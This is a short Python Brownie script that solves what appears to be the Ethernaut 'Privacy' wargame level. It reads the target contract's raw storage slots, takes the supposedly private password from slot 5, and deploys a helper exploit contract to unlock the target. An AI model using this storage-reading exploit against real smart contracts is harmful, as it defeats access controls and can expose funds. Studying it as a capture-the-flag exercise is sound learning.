from brownie import Privacy,PrivacyExploit, config,accounts,web3

#input the contract address
#> contract.address
contractAddress = '0x3B437647a2B3e68C683fE2148085BE6F03101523'
player = accounts.add(config["wallets"]["from_key"])

def solution():
    privacy = Privacy.at(contractAddress)
    slot0 = web3.eth.getStorageAt(privacy.address,0)
    slot1 = web3.eth.getStorageAt(privacy.address,1)
    slot2 = web3.eth.getStorageAt(privacy.address,2)
    slot3 = web3.eth.getStorageAt(privacy.address,3)
    slot4 = web3.eth.getStorageAt(privacy.address,4)
    slot5 = web3.eth.getStorageAt(privacy.address,5)
    
    print(slot0) #bool public locked = true;
    print(slot1) #uint256 public ID = block.timestamp;
    print(slot2) #uint8 private flattening = 10;
                 #uint8 private denomination = 255;
                 #uint16 private awkwardness = uint16(now);
    print(slot3) #bytes32[0] private data;
    print(slot4) #bytes32[1] private data;
    print(slot5) #bytes32[2] private data;

    password = web3.eth.getStorageAt(privacy.address,5)

    exploit = PrivacyExploit.deploy(privacy.address,{"from":player})

    exploit.unlock(password,{"from":player})
    
def main():
    solution()